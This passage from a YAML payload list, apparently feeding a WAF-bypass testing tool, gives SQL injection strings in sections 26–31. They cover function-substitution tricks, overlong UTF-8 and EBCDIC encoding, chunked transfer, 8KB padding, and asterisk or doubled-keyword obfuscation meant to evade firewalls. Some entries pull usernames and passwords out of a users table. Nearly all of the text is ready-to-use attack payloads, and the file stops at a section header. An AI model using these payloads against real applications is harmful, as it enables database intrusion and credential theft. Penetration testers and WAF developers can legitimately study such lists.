###############################################################################
# 26. FUNCTION ALTERNATIVES BYPASS (Research: OWASP, Codex)
# Replace blocked SQL functions with equivalents
###############################################################################
function_alternatives:
  concat:
    - payload: "' UNION SELECT 1,CONCAT_WS(0x3a,username,password),3 FROM users -- -"
      description: "CONCAT_WS instead of CONCAT — with separator"
      technique: "func_alt_concat"
    - payload: "' UNION SELECT 1,username||0x3a||password,3 FROM users -- -"
      description: "|| concatenation instead of CONCAT (PostgreSQL/Oracle)"
      technique: "func_alt_concat"
      dbms: "PostgreSQL/Oracle"

  substring:
    - payload: "' AND MID((SELECT @@version),1,1)='5' -- -"
      description: "MID() instead of SUBSTRING()"
      technique: "func_alt_substr"
    - payload: "' AND LEFT((SELECT @@version),1)='5' -- -"
      description: "LEFT() instead of SUBSTRING()"
      technique: "func_alt_substr"
    - payload: "' AND RIGHT((SELECT @@version),1)='5' -- -"
      description: "RIGHT() instead of SUBSTRING()"
      technique: "func_alt_substr"
    - payload: "' AND LPAD((SELECT @@version),1,'x')='5' -- -"
      description: "LPAD() trick — extract first char"
      technique: "func_alt_substr"

  if_case:
    - payload: "' AND CASE WHEN 1=1 THEN 1 ELSE 0 END -- -"
      description: "CASE WHEN instead of IF() — avoids commas too"
      technique: "func_alt_if"
      tag: "advanced"
    - payload: "' AND IFNULL(1,0)=1 -- -"
      description: "IFNULL instead of IF"
      technique: "func_alt_if"
    - payload: "' AND NULLIF(1,1) IS NULL -- -"
      description: "NULLIF instead of comparison"
      technique: "func_alt_if"

  version_info:
    - payload: "' AND @@version LIKE '%5.%' -- -"
      description: "@@version instead of VERSION() function"
      technique: "func_alt_version"
    - payload: "' AND schema()=database() -- -"
      description: "SCHEMA() instead of DATABASE()"
      technique: "func_alt_version"

  sleep_benchmark:
    - payload: "' AND BENCHMARK(10000000,MD5(NOW())) -- -"
      description: "BENCHMARK instead of SLEEP (MySQL heavy query)"
      technique: "func_alt_sleep"
      tag: "advanced"
    - payload: "' AND (SELECT COUNT(*) FROM information_schema.columns A, information_schema.columns B) -- -"
      description: "Heavy cartesian join instead of SLEEP"
      technique: "func_alt_sleep"
    - payload: "' AND (SELECT COUNT(*) FROM GENERATE_SERIES(1,10000000)) -- -"
      description: "PostgreSQL GENERATE_SERIES heavy query"
      technique: "func_alt_sleep"
      dbms: "PostgreSQL"

###############################################################################
# 27. CHARSET/ENCODING BYPASS (Research: Stiletto, IBM037 charset, WAFFLED)
# Use alternative character encodings to bypass WAF parsers
###############################################################################
charset_bypass:
  ibm037:
    - payload: "IBM037-encoded SQL via Content-Type: charset=ibm037"
    description: "EBCDIC IBM037 charset — most WAFs don't decode EBCDIC"
    technique: "ebcdic_bypass"
    tag: "advanced"
  overlong_utf8:
    - payload: "%C0%A7' OR 1=1 -- -"
      description: "Overlong UTF-8 encoding for quote — WAF doesn't decode"
      technique: "overlong_utf8"
    - payload: "%C0%AE OR 1=1 -- -"
      description: "Overlong UTF-8 dot"
      technique: "overlong_utf8"
  chunked_transfer:
    - payload: "Transfer-Encoding: chunked (split payload across chunks)"
      description: "Chunked transfer encoding — WAF inspects first chunk only"
      technique: "chunked_bypass"
      tag: "advanced"

###############################################################################
# 28. PAD TO SIZE / BUFFER OVERFLOW (Research: OWASP, sqlmap-tamper-collection)
# Pad payload to specific sizes to trigger WAF buffer limits
###############################################################################
size_bypass:
  pad_to_8kb:
    - payload: "' OR 1=1 -- " + "A"*8000 + " -- -"
      description: "Pad to 8KB — overflow WAF buffer, WAF stops inspecting"
      technique: "size_overflow"
      tag: "advanced"
    - payload: "' UNION SELECT 1,2,3 " + "A"*8000 + " -- -"
      description: "Pad UNION payload to 8KB"
      technique: "size_overflow"

###############################################################################
# 29. ASTERISK/REPLACE EXPLOIT (Research: OWASP WAF bypass section 3)
# If WAF replaces * with space, inject * within keywords
###############################################################################
asterisk_bypass:
  - payload: "' UN*ION SEL*ECT 1,2,3 -- -"
    description: "Asterisk inside keywords — if WAF replaces * with space, becomes valid SQL"
    technique: "asterisk_replace"
    tag: "advanced"
  - payload: "' UN*ION*ALL SEL*ECT 1,2,3 -- -"
    description: "Asterisk UNION ALL"
    technique: "asterisk_replace"
  - payload: "' AN*D 1=1 -- -"
    description: "Asterisk AND"
    technique: "asterisk_replace"

###############################################################################
# 30. PARTIAL WORD / TRUNCATION MATCH (Research: HackTricks)
# Use partial keyword that becomes complete after WAF processing
###############################################################################
partial_word:
  - payload: "' UNIOUNIONN SELESELECTCT 1,2,3 -- -"
    description: "Partial word duplication — WAF removes inner UNION, leaving valid SQL"
    technique: "partial_word"
    tag: "classic"
  - payload: "' ANANDD 1=1 -- -"
    description: "Partial AND duplication"
    technique: "partial_word"
  - payload: "' OROR 1=1 -- -"
    description: "Partial OR duplication"
    technique: "partial_word"
  - payload: "' WHWHEREERE 1=1 -- -"
    description: "Partial WHERE duplication"
    technique: "partial_word"

###############################################################################
# 31. SECOND-ORDER TIME-BASED via STORED XSS-like SQLi (Research: 60 reports)
